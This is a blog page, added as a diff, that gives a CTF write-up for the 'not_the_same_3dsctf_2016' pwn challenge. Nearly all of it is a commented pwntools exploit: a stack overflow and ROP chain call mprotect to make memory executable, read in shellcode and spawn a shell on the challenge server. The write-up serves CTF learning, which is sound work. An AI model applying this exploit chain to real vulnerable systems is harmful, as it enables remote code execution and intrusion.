@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Not_the_same_3dsctf_2016 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Not_the_same_3dsctf_2016</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/02/18</h2>
+</div>
+
+<main>
+<h1 id="not_the_same_3dsctf_2016">not_the_same_3dsctf_2016</h1>
+<p>本题原本是个简单的栈溢出，因为buu环境问题只能利用其它方法，与get_started_3dsctf_2016解法相同</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*-coding=UTF-8-*-</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./not_the_same_3dsctf_2016</span><span style="color:#e6db74">&#39;</span>)
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">28777</span>)
+
+pop3_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804f420</span><span style="color:#75715e">#gadget:pop ebx; pop esi; pop ebp; ret;用来向mprotect()、read()传参</span>
+				     <span style="color:#75715e">#ROPgadget --binary get_started --only &#39;pop|ret&#39; | grep pop</span>
+<span style="color:#75715e">#为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令，为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.</span>
+
+mem_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80eb000</span> <span style="color:#75715e">#可读可写的内存,但不可执行</span>
+mem_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>    <span style="color:#75715e">#通过调试出来的值</span>
+mem_proc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7</span>       <span style="color:#75715e">#可代表可读可写可执行</span>
+
+mprotect_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">mprotect</span><span style="color:#e6db74">&#39;</span>]
+read_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">read</span><span style="color:#e6db74">&#39;</span>]
+
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">45</span> <span style="color:#75715e">#填充数据覆盖到ebp</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(mprotect_addr) <span style="color:#75715e">#栈返回到mprotect()函数执行</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(pop3_ret) <span style="color:#75715e">#执行完mprotect的返回地址,使esp往下+12</span>
+
+<span style="color:#75715e">#mprotect 的三个参数 mprotect(0x080ea000,0x1000,0x7)</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(mem_addr)   <span style="color:#75715e">#mprotect函数参数1 修改的内存地址</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(mem_size)   <span style="color:#75715e">#mprotect函数参数2 修改的内存大小</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(mem_proc)   <span style="color:#75715e">#mprotect函数参数3 修改的权限</span>
+
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(read_addr) <span style="color:#75715e">#执行完pop3_ret后弹到read地址</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(pop3_ret)  <span style="color:#75715e">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span>
+
+<span style="color:#75715e">#read 的三个参数 read(0,0x080ea000,0x100)</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0</span>)     <span style="color:#75715e">#read函数参数1 ,从输入端读取，将我们生成的shellcode读入目标内存地址</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(mem_addr)   <span style="color:#75715e">#读取到的内容复制到指向的内存里</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x100</span>) <span style="color:#75715e">#读取大小</span>
+
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(mem_addr)   <span style="color:#75715e">#执行完read后ret esi，这里是返回到我们布置的shellcode执行</span>
+
+sh<span style="color:#f92672">.</span>sendline(payload)
+payload_shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh(),arch <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">i386</span><span style="color:#e6db74">&#39;</span>, os <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">linux</span><span style="color:#e6db74">&#39;</span>) 
+
+sh<span style="color:#f92672">.</span>sendline(payload_shellcode)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
